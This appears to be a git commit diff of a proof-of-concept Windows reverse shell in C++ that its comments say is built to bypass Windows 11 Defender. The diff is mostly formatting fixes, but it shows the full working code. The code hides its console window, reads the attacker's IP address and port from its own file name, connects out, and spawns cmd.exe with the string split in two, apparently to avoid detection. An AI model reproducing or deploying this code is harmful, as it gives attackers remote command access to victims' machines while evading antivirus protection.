0cf2855fca24e73182df26d6b29fe7dd884725ed
Harith Dilshan <23568388+h4rithd@users.noreply.github.com>
2021-12-21 20:54:45 +0530

    add some fixes for PCH

--- Reverse_shell_2021_12.cpp
+++ Reverse_shell_2021_12.cpp
@@ -1,10 +1,13 @@
-#POC reverse shell written by Norbert Tihanyi to bypass Windows 11 Defender (December 2021) 
-#Twitter: @TihanyiNorbert
-
-#include "stdafx.h"
 #include <winsock2.h>
 #include <stdio.h>
+#include <tchar.h>
 #include <string>
+
+/*
+POC reverse shell written by Norbert Tihanyi to bypass Windows 11 Defender(December 2021)
+Twitter: @TihanyiNorbert
+The IP address and port are hardcoded into the file name (e.g: 10x10x14x25_4545.exe)
+*/
 
 #pragma comment(lib,"ws2_32")
 #pragma warning(disable:4996) 
@@ -13,18 +16,16 @@ struct sockaddr_in R;
 STARTUPINFO A;
 PROCESS_INFORMATION B;
 using std::string;
-string getFileName(const string& s) {
 
+string getFileName(const string& s) {
 	char sep = '/';
-	
-	#ifdef _WIN32
-		sep = '\\';
-	#endif
+#ifdef _WIN32
+	sep = '\\';
+#endif
 	size_t i = s.rfind(sep, s.length());
 	if (i != string::npos) {
 		return(s.substr(i + 1, s.length() - i));
 	}
-
 	return("");
 }
 
@@ -32,7 +33,7 @@ int main(int argc, char *argv[])
 {
 	FreeConsole(); //Hide window
 	WSAStartup(MAKEWORD(2, 2), &wsaData);
-	string path =getFileName(argv[0]);
+	string path = getFileName(argv[0]);
 	path.resize(path.size() - 4); //remove .exe from the file
 	//replace x to "."
 	for (int i = 0; i < path.size(); i++) {
@@ -42,7 +43,7 @@ int main(int argc, char *argv[])
 	}
 	//PORT and IP from the executable
 	size_t i = path.rfind("_", path.length());
-	string port = path.substr(i+1, i-path.length());
+	string port = path.substr(i + 1, i - path.length());
 	string ip = path.substr(0, i);
 	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
 	R.sin_family = AF_INET;
@@ -56,6 +57,4 @@ int main(int argc, char *argv[])
 	TCHAR c[256] = L"cm";
 	TCHAR d[256] = L"d.exe";
 	CreateProcess(NULL, _tcscat(c, d), 0, 0, 1, 0, 0, 0, &A, &B);
-
 }
-
